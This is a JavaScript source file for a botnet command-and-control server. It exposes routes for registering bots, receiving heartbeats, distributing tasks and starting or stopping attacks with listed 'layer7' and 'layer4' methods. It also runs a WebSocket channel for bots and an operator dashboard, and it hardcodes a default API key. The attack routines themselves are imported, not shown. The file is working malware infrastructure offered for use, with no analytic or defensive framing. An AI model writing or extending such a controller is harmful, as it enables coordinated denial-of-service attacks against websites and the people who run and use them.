import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import cors from 'cors';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';
import { C2Controller } from './controller.js';
import { C2Database } from './database.js';
import { authMiddleware } from './middleware/auth.js';
import { methodExecutor } from './method-executor.js';
import { attackMonitor } from './monitor.js';
import { logger } from '../utils/logger.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

export class C2Server {
    constructor(config = {}) {
        this.config = {
            port: config.port || 8080,
            host: config.host || '0.0.0.0',
            apiKey: config.apiKey || 'aryzz-c2-api-key-2024',
            ...config
        };

        this.app = express();
        this.httpServer = createServer(this.app);
        this.io = new Server(this.httpServer, {
            cors: {
                origin: '*',
                methods: ['GET', 'POST']
            }
        });

        this.db = new C2Database();
        this.controller = new C2Controller(this.db, this.io);
        
        this.setupMiddleware();
        this.setupRoutes();
        this.setupWebSocket();
    }

    setupMiddleware() {
        this.app.use(cors());
        this.app.use(express.json());
        this.app.use(express.urlencoded({ extended: true }));
        
        // Logging middleware
        this.app.use((req, res, next) => {
            logger.debug(`${req.method} ${req.path}`);
            next();
        });

        // Static files for dashboard
        this.app.use('/dashboard', express.static(join(__dirname, 'dashboard')));
    }

    setupRoutes() {
        const router = express.Router();

        // ============================================
        // 🔐 AUTHENTICATION ROUTES
        // ============================================
        router.post('/auth/login', async (req, res) => {
            try {
                const { username, password } = req.body;
                const token = await this.controller.login(username, password);
                res.json({ success: true, token });
            } catch (error) {
                res.status(401).json({ success: false, error: error.message });
            }
        });

        // ============================================
        // 🤖 BOT MANAGEMENT ROUTES
        // ============================================
        router.post('/bot/register', async (req, res) => {
            try {
                const bot = await this.controller.registerBot(req.body);
                res.json({ success: true, bot });
            } catch (error) {
                res.status(400).json({ success: false, error: error.message });
            }
        });

        router.get('/bots', authMiddleware(this.config.apiKey), async (req, res) => {
            try {
                const bots = await this.controller.getBots();
                res.json({ success: true, bots });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        router.get('/bot/:id', authMiddleware(this.config.apiKey), async (req, res) => {
            try {
                const bot = await this.controller.getBot(req.params.id);
                res.json({ success: true, bot });
            } catch (error) {
                res.status(404).json({ success: false, error: error.message });
            }
        });

        router.post('/bot/:id/heartbeat', async (req, res) => {
            try {
                await this.controller.updateBotHeartbeat(req.params.id, req.body);
                res.json({ success: true });
            } catch (error) {
                res.status(400).json({ success: false, error: error.message });
            }
        });

        // ============================================
        // ⚡ ATTACK MANAGEMENT ROUTES
        // ============================================
        router.post('/attack/start', authMiddleware(this.config.apiKey), async (req, res) => {
            try {
                const attack = await this.controller.startAttack(req.body);
                res.json({ success: true, attack });
            } catch (error) {
                res.status(400).json({ success: false, error: error.message });
            }
        });

        router.post('/attack/:id/stop', authMiddleware(this.config.apiKey), async (req, res) => {
            try {
                await this.controller.stopAttack(req.params.id);
                res.json({ success: true });
            } catch (error) {
                res.status(400).json({ success: false, error: error.message });
            }
        });

        router.get('/attacks', authMiddleware(this.config.apiKey), async (req, res) => {
            try {
                const attacks = await this.controller.getAttacks(req.query);
                res.json({ success: true, attacks });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        router.get('/attack/:id', authMiddleware(this.config.apiKey), async (req, res) => {
            try {
                const attack = await this.controller.getAttack(req.params.id);
                res.json({ success: true, attack });
            } catch (error) {
                res.status(404).json({ success: false, error: error.message });
            }
        });

        router.get('/attack/:id/stats', authMiddleware(this.config.apiKey), async (req, res) => {
            try {
                const stats = await this.controller.getAttackStats(req.params.id);
                res.json({ success: true, stats });
            } catch (error) {
                res.status(404).json({ success: false, error: error.message });
            }
        });

        // ============================================
        // 📊 STATISTICS ROUTES
        // ============================================
        router.get('/stats/overview', authMiddleware(this.config.apiKey), async (req, res) => {
            try {
                const stats = await this.controller.getOverviewStats();
                res.json({ success: true, stats });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        router.get('/stats/bots', authMiddleware(this.config.apiKey), async (req, res) => {
            try {
                const stats = await this.controller.getBotStats();
                res.json({ success: true, stats });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        // ============================================
        // 🎯 TASK MANAGEMENT ROUTES
        // ============================================
        router.post('/task/create', authMiddleware(this.config.apiKey), async (req, res) => {
            try {
                const task = await this.controller.createTask(req.body);
                res.json({ success: true, task });
            } catch (error) {
                res.status(400).json({ success: false, error: error.message });
            }
        });

        router.get('/tasks', authMiddleware(this.config.apiKey), async (req, res) => {
            try {
                const tasks = await this.controller.getTasks(req.query);
                res.json({ success: true, tasks });
            } catch (error) {
                res.status(500).json({ success: false, error: error.message });
            }
        });

        router.get('/bot/:id/tasks', async (req, res) => {
            try {
                const tasks = await this.controller.getBotTasks(req.params.id);
                res.json({ success: true, tasks });
            } catch (error) {
                res.status(404).json({ success: false, error: error.message });
            }
        });

        router.post('/task/:id/complete', async (req, res) => {
            try {
                await this.controller.completeTask(req.params.id, req.body);
                res.json({ success: true });
            } catch (error) {
                res.status(400).json({ success: false, error: error.message });
            }
        });

        // Methods endpoint
        router.get('/methods', (req, res) => {
            const methods = methodExecutor.getAllMethods();
            res.json({
                success: true,
                methods: {
                    layer7: methods.layer7,
                    layer4: methods.layer4,
                    total: methods.total
                }
            });
        });

        // Monitor stats endpoint
        router.get('/monitor/stats', authMiddleware(this.config.apiKey), (req, res) => {
            const stats = attackMonitor.getStats();
            res.json({
                success: true,
                stats
            });
        });

        // Health check
        router.get('/health', (req, res) => {
            res.json({ 
                success: true, 
                status: 'online',
                timestamp: new Date().toISOString(),
                version: '1.0.0',
                supportedMethods: methodExecutor.getAllMethods().total
            });
        });

        // Mount router
        this.app.use('/api', router);

        // Dashboard route
        this.app.get('/', (req, res) => {
            res.sendFile(join(__dirname, 'dashboard', 'index.html'));
        });
    }

    setupWebSocket() {
        this.io.on('connection', (socket) => {
            logger.info(`🔌 WebSocket client connected: ${socket.id}`);

            // Bot connection
            socket.on('bot:connect', async (data) => {
                try {
                    const { botId, apiKey } = data;
                    
                    if (apiKey !== this.config.apiKey) {
                        socket.emit('error', { message: 'Invalid API key' });
                        socket.disconnect();
                        return;
                    }

                    socket.botId = botId;
                    socket.join(`bot:${botId}`);
                    
                    await this.controller.updateBotStatus(botId, 'online');
                    logger.info(`🤖 Bot ${botId} connected via WebSocket`);
                    
                    socket.emit('connected', { success: true });
                } catch (error) {
                    socket.emit('error', { message: error.message });
                }
            });

            // Bot stats update
            socket.on('bot:stats', async (data) => {
                try {
                    if (socket.botId) {
                        await this.controller.updateBotStats(socket.botId, data);
                        this.io.emit('stats:update', { botId: socket.botId, stats: data });
                    }
                } catch (error) {
                    logger.error('Error updating bot stats:', error);
                }
            });

            // Attack progress update
            socket.on('attack:progress', async (data) => {
                try {
                    const { attackId, progress } = data;
                    await this.controller.updateAttackProgress(attackId, progress);
                    this.io.emit('attack:update', { attackId, progress });
                } catch (error) {
                    logger.error('Error updating attack progress:', error);
                }
            });

            // Disconnect
            socket.on('disconnect', async () => {
                if (socket.botId) {
                    await this.controller.updateBotStatus(socket.botId, 'offline');
                    logger.info(`🤖 Bot ${socket.botId} disconnected`);
                }
                logger.info(`🔌 WebSocket client disconnected: ${socket.id}`);
            });
        });
    }

    async start() {
        try {
            await this.db.initialize();
            
            await new Promise((resolve) => {
                this.httpServer.listen(this.config.port, this.config.host, () => {
                    resolve();
                });
            });

            logger.success(`\n╔═══════════════════════════════════════════════════════════╗`);
            logger.success(`║          🎯 C2 SERVER STARTED SUCCESSFULLY 🎯            ║`);
            logger.success(`╚═══════════════════════════════════════════════════════════╝`);
            logger.info(`\n📡 C2 Server running on: http://${this.config.host}:${this.config.port}`);
            logger.info(`🌐 Dashboard: http://localhost:${this.config.port}/dashboard`);
            logger.info(`🔌 WebSocket: ws://localhost:${this.config.port}`);
            logger.info(`🔑 API Key: ${this.config.apiKey}`);
            logger.info(`\n📚 API Endpoints:`);
            logger.info(`   POST /api/auth/login - Login`);
            logger.info(`   POST /api/bot/register - Register bot`);
            logger.info(`   GET  /api/bots - List all bots`);
            logger.info(`   POST /api/attack/start - Start attack`);
            logger.info(`   POST /api/attack/:id/stop - Stop attack`);
            logger.info(`   GET  /api/attacks - List attacks`);
            logger.info(`   GET  /api/stats/overview - Get statistics`);
            logger.info(`\n🚀 Ready to accept commands!\n`);
        } catch (error) {
            logger.error('Failed to start C2 server:', error);
            throw error;
        }
    }

    async stop() {
        logger.info('Stopping C2 server...');
        this.io.close();
        this.httpServer.close();
        await this.db.close();
        logger.success('C2 server stopped');
    }
}

export async function startC2Server(config) {
    const server = new C2Server(config);
    await server.start();
    return server;
}
